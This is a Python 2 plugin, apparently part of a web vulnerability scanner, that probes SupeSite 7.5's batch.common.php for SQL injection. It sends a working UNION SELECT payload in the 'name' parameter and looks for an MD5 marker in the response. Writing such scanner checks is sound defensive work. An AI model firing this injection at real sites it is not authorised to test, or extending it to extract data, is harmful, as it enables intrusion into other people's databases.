#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "batch.common.php?action=modelquote&cid=1&name=spacecomments%20where%201=2%20union%20select%201,2,3,4,5,concat(0x7e,md5(333),0x7e),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:SupeSite_7_5_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SupeSite_7_5_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
